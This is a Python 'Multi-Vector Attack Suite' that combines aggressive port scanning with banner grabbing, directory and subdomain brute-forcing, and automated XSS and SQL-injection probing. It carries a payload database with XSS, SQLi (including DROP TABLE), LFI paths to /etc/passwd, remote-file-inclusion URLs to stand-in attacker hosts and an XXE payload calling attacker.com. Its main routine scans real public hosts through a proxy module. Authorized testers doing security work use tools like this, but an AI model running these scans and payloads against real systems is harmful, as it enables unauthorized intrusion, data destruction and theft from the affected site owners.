from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
💀 MULTI-VECTOR ATTACK SUITE 💀
🔥 Advanced Reconnaissance & Penetration Testing Framework 🔥
⚡ For Educational & Authorized Security Testing Only ⚡
"""

import asyncio
import aiohttp
import random
import time
import json
import threading
import subprocess
import socket
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Tuple
import hashlib
import base64
from urllib.parse import urljoin, urlparse
import ssl

class MultiVectorAttackSuite:
    """
    💀 Advanced Multi-Vector Attack Suite
    
    Features:
    🔥 Port Scanning & Service Discovery
    ⚡ Web Application Scanning
    🛡️ SSL/TLS Analysis
    🎯 Directory Bruteforcing
    🔍 Subdomain Discovery
    🚀 Payload Generation
    💀 Traffic Analysis
    """
    
    def __init__(self, proxy_warfare=None):
        self.proxy_warfare = proxy_warfare
        self.discovered_services = {}
        self.vulnerabilities = []
        self.attack_vectors = []
        
        # Advanced payload database
        self.payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                "';alert('XSS');//",
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '<svg onload=alert("XSS")>',
                '<%2Fscript%3E%3Cscript%3Ealert("XSS")%3C%2Fscript%3E'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users; --",
                "' OR 1=1#",
                "admin'--",
                "' OR 'a'='a",
                "1' OR '1'='1' /*",
                "') OR ('1'='1",
                "' WAITFOR DELAY '00:00:05'--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc//passwd',
                '/etc/passwd%00',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '....\/....\/....\/etc\/passwd',
                '/var/log/apache2/access.log',
                '../../../windows/system32/drivers/etc/hosts'
            ],
            'rfi': [
                'http://evil.com/shell.txt',
                'https://pastebin.com/raw/malicious',
                'ftp://attacker.com/backdoor.php'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>'
            ]
        }
        
        # Common directories for bruteforcing
        self.directories = [
            'admin', 'administrator', 'login', 'panel', 'dashboard',
            'wp-admin', 'wp-login', 'phpmyadmin', 'cpanel', 'webmail',
            'api', 'v1', 'v2', 'test', 'dev', 'staging', 'backup',
            'uploads', 'files', 'documents', 'images', 'assets',
            'config', 'database', 'db', 'sql', 'logs', 'log',
            '.git', '.svn', '.env', 'robots.txt', 'sitemap.xml',
            'readme.txt', 'changelog.txt', 'license.txt'
        ]
        
        # Common subdomains
        self.subdomains = [
            'www', 'mail', 'ftp', 'api', 'admin', 'test', 'dev',
            'staging', 'beta', 'alpha', 'demo', 'app', 'mobile',
            'secure', 'portal', 'dashboard', 'panel', 'cpanel',
            'webmail', 'blog', 'shop', 'store', 'support', 'help'
        ]
        
        print("💀 Multi-Vector Attack Suite Initialized")
        print("🔥 Loaded payload database")
        print("⚡ Ready for reconnaissance operations")
    
    def port_scan_aggressive(self, target: str, ports: List[int] = None) -> Dict:
        """
        🔥 Aggressive port scanning
        """
        if ports is None:
            # Top 1000 ports + some extras
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 
                    1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
        
        print(f"🎯 Starting aggressive port scan on {target}")
        print(f"🔍 Scanning {len(ports)} ports...")
        
        open_ports = []
        services = {}
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    # Try to grab banner
                    try:
                        sock.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                        services[port] = self._identify_service(port, banner)
                    except:
                        services[port] = self._identify_service(port, '')
                    
                    open_ports.append(port)
                    print(f"✅ Port {port} OPEN - {services.get(port, 'Unknown')}")
                
                sock.close()
            except Exception:
                pass
        
        # Threaded scanning for speed
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, ports)
        
        self.discovered_services[target] = {'ports': open_ports, 'services': services}
        
        return {
            'target': target,
            'open_ports': open_ports,
            'services': services,
            'total_scanned': len(ports)
        }
    
    def _identify_service(self, port: int, banner: str) -> str:
        """Identify service by port and banner"""
        
        service_map = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC',
            139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
            993: 'IMAPS', 995: 'POP3S', 1723: 'PPTP',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt', 9200: 'Elasticsearch', 27017: 'MongoDB'
        }
        
        base_service = service_map.get(port, f'Port-{port}')
        
        # Analyze banner for more details
        if banner:
            banner_lower = banner.lower()
            if 'apache' in banner_lower:
                return f"{base_service} (Apache)"
            elif 'nginx' in banner_lower:
                return f"{base_service} (Nginx)"
            elif 'iis' in banner_lower:
                return f"{base_service} (IIS)"
            elif 'openssh' in banner_lower:
                return f"{base_service} (OpenSSH)"
            elif 'mysql' in banner_lower:
                return f"{base_service} (MySQL)"
        
        return base_service
    
    def web_application_scan(self, target_url: str) -> Dict:
        """
        🕷️ Advanced web application vulnerability scanning
        """
        print(f"🕷️ Starting web application scan on {target_url}")
        
        results = {
            'target': target_url,
            'vulnerabilities': [],
            'endpoints': [],
            'technologies': [],
            'security_headers': {},
            'cookies': {}
        }
        
        try:
            # Technology detection
            technologies = self._detect_technologies(target_url)
            results['technologies'] = technologies
            
            # Security headers analysis
            headers = self._analyze_security_headers(target_url)
            results['security_headers'] = headers
            
            # Directory bruteforcing
            endpoints = self._directory_bruteforce(target_url)
            results['endpoints'] = endpoints
            
            # Vulnerability testing
            vulns = self._test_common_vulns(target_url)
            results['vulnerabilities'] = vulns
            
        except Exception as e:
            print(f"❌ Web scan error: {e}")
        
        return results
    
    def _detect_technologies(self, url: str) -> List[str]:
        """Detect web technologies"""
        technologies = []
        
        try:
            if self.proxy_warfare:
                response_data = self.proxy_warfare.advanced_request(url)
                if not response_data:
                    return technologies
                
                headers = response_data['headers']
                content = response_data['content']
            else:
                import requests
                response = requests.get(url, timeout=10)
                headers = response.headers
                content = response.text
            
            # Server detection
            server = headers.get('Server', '').lower()
            if 'apache' in server:
                technologies.append('Apache')
            elif 'nginx' in server:
                technologies.append('Nginx')
            elif 'iis' in server:
                technologies.append('IIS')
            
            # Framework detection
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by']
                technologies.append(f"Powered by: {powered_by}")
            
            # Content analysis
            content_lower = content.lower()
            if 'wordpress' in content_lower or 'wp-content' in content_lower:
                technologies.append('WordPress')
            elif 'drupal' in content_lower:
                technologies.append('Drupal')
            elif 'joomla' in content_lower:
                technologies.append('Joomla')
            elif 'django' in content_lower:
                technologies.append('Django')
            elif 'laravel' in content_lower:
                technologies.append('Laravel')
            
        except Exception as e:
            print(f"❌ Technology detection error: {e}")
        
        return technologies
    
    def _analyze_security_headers(self, url: str) -> Dict:
        """Analyze security headers"""
        security_status = {}
        
        try:
            if self.proxy_warfare:
                response_data = self.proxy_warfare.advanced_request(url)
                if not response_data:
                    return security_status
                headers = response_data['headers']
            else:
                import requests
                response = requests.get(url, timeout=10)
                headers = response.headers
            
            # Critical security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Referrer-Policy'
            ]
            
            for header in security_headers:
                if header in headers:
                    security_status[header] = f"✅ {headers[header]}"
                else:
                    security_status[header] = "❌ Missing"
            
        except Exception as e:
            print(f"❌ Security header analysis error: {e}")
        
        return security_status
    
    def _directory_bruteforce(self, base_url: str) -> List[str]:
        """Directory bruteforcing"""
        found_endpoints = []
        
        print("🔍 Starting directory bruteforce...")
        
        def check_directory(directory):
            try:
                test_url = urljoin(base_url, directory)
                
                if self.proxy_warfare:
                    response_data = self.proxy_warfare.advanced_request(test_url)
                    if response_data and response_data['status_code'] == 200:
                        found_endpoints.append(test_url)
                        print(f"✅ Found: {test_url}")
                else:
                    import requests
                    response = requests.get(test_url, timeout=5)
                    if response.status_code == 200:
                        found_endpoints.append(test_url)
                        print(f"✅ Found: {test_url}")
                        
            except Exception:
                pass
        
        # Threaded directory checking
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_directory, self.directories[:20])  # Limit for demo
        
        return found_endpoints
    
    def _test_common_vulns(self, url: str) -> List[Dict]:
        """Test for common vulnerabilities"""
        vulnerabilities = []
        
        print("🎯 Testing for common vulnerabilities...")
        
        # XSS Testing
        xss_vulns = self._test_xss(url)
        vulnerabilities.extend(xss_vulns)
        
        # SQL Injection Testing
        sqli_vulns = self._test_sqli(url)
        vulnerabilities.extend(sqli_vulns)
        
        return vulnerabilities
    
    def _test_xss(self, url: str) -> List[Dict]:
        """Test for XSS vulnerabilities"""
        xss_vulns = []
        
        # Simple XSS payload testing
        for payload in self.payloads['xss'][:3]:  # Test first 3 payloads
            try:
                test_url = f"{url}?test={payload}"
                
                if self.proxy_warfare:
                    response_data = self.proxy_warfare.advanced_request(test_url)
                    if response_data and payload in response_data['content']:
                        xss_vulns.append({
                            'type': 'XSS',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Reflected XSS vulnerability detected'
                        })
                        print(f"🚨 XSS vulnerability found: {test_url}")
                        
            except Exception:
                pass
        
        return xss_vulns
    
    def _test_sqli(self, url: str) -> List[Dict]:
        """Test for SQL injection vulnerabilities"""
        sqli_vulns = []
        
        # Simple SQL injection testing
        for payload in self.payloads['sqli'][:3]:  # Test first 3 payloads
            try:
                test_url = f"{url}?id={payload}"
                
                if self.proxy_warfare:
                    response_data = self.proxy_warfare.advanced_request(test_url)
                    if response_data:
                        content = response_data['content'].lower()
                        
                        # Look for SQL error indicators
                        sql_errors = ['mysql_fetch', 'ora-', 'microsoft ole db', 'postgresql']
                        if any(error in content for error in sql_errors):
                            sqli_vulns.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'payload': payload,
                                'description': 'SQL injection vulnerability detected'
                            })
                            print(f"🚨 SQL Injection vulnerability found: {test_url}")
                            
            except Exception:
                pass
        
        return sqli_vulns
    
    def subdomain_discovery(self, domain: str) -> List[str]:
        """Advanced subdomain discovery"""
        print(f"🔍 Starting subdomain discovery for {domain}")
        
        discovered_subdomains = []
        
        def check_subdomain(subdomain):
            try:
                full_domain = f"{subdomain}.{domain}"
                
                # DNS resolution check
                socket.gethostbyname(full_domain)
                discovered_subdomains.append(full_domain)
                print(f"✅ Found subdomain: {full_domain}")
                
            except socket.gaierror:
                pass
            except Exception:
                pass
        
        # Threaded subdomain checking
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_subdomain, self.subdomains)
        
        return discovered_subdomains
    
    def generate_comprehensive_report(self, targets: List[str]) -> str:
        """Generate comprehensive penetration testing report"""
        
        report = f"""
💀 MULTI-VECTOR ATTACK SUITE REPORT 💀
🔥 COMPREHENSIVE PENETRATION TESTING RESULTS 🔥
{'='*60}

📊 RECONNAISSANCE SUMMARY:
  Total Targets: {len(targets)}
  Services Discovered: {len(self.discovered_services)}
  Vulnerabilities Found: {len(self.vulnerabilities)}
  Attack Vectors Identified: {len(self.attack_vectors)}

"""
        
        # Service discovery results
        if self.discovered_services:
            report += "🎯 DISCOVERED SERVICES:\n"
            for target, data in self.discovered_services.items():
                report += f"  Target: {target}\n"
                report += f"    Open Ports: {', '.join(map(str, data['ports']))}\n"
                for port, service in data['services'].items():
                    report += f"    Port {port}: {service}\n"
                report += "\n"
        
        # Vulnerability summary
        if self.vulnerabilities:
            report += "🚨 CRITICAL VULNERABILITIES:\n"
            for vuln in self.vulnerabilities:
                report += f"  {vuln['type']} ({vuln['severity']})\n"
                report += f"    URL: {vuln['url']}\n"
                report += f"    Description: {vuln['description']}\n\n"
        
        report += f"""
🛡️ SECURITY RECOMMENDATIONS:
  1. Implement proper input validation
  2. Use parameterized queries for database access
  3. Enable security headers (CSP, HSTS, etc.)
  4. Regular security updates and patches
  5. Implement proper authentication mechanisms
  6. Use HTTPS for all communications
  7. Regular penetration testing

💀 ATTACK SURFACE ANALYSIS COMPLETE 💀
⚡ Use this information responsibly for security improvement ⚡
"""
        
        return report

@safe_execution
def main():
    """Launch Multi-Vector Attack Suite"""
    
    print("💀" * 25)
    print("💀 MULTI-VECTOR ATTACK SUITE 💀")
    print("🔥 ADVANCED PENETRATION TESTING FRAMEWORK 🔥")
    print("💀" * 25)
    
    # Initialize attack suite
    try:
        from advanced_proxy_warfare import AdvancedProxyWarfare
        proxy_warfare = AdvancedProxyWarfare()
        attack_suite = MultiVectorAttackSuite(proxy_warfare)
        print("⚡ Integrated with Advanced Proxy Warfare System")
    except:
        attack_suite = MultiVectorAttackSuite()
        print("⚠️ Running without proxy integration")
    
    # Demo target (use your own authorized targets)
    test_targets = [
        "httpbin.org",
        "example.com"
    ]
    
    print(f"\n🎯 Testing {len(test_targets)} targets...")
    
    for target in test_targets:
        print(f"\n🔥 Attacking target: {target}")
        
        # Port scanning
        print("1️⃣ Port Scanning...")
        port_results = attack_suite.port_scan_aggressive(target)
        
        # Web application scanning  
        if 80 in port_results['open_ports'] or 443 in port_results['open_ports']:
            print("2️⃣ Web Application Scanning...")
            protocol = 'https' if 443 in port_results['open_ports'] else 'http'
            web_results = attack_suite.web_application_scan(f"{protocol}://{target}")
            
            if web_results['vulnerabilities']:
                attack_suite.vulnerabilities.extend(web_results['vulnerabilities'])
        
        # Subdomain discovery
        print("3️⃣ Subdomain Discovery...")
        subdomains = attack_suite.subdomain_discovery(target)
        
        print(f"✅ Completed scanning {target}")
    
    # Generate final report
    print("\n📋 Generating comprehensive report...")
    report = attack_suite.generate_comprehensive_report(test_targets)
    print(report)
    
    print("\n💀 MULTI-VECTOR ATTACK COMPLETE 💀")
    print("⚡ Remember: Use responsibly for authorized testing only ⚡")

if __name__ == "__main__":
    main()
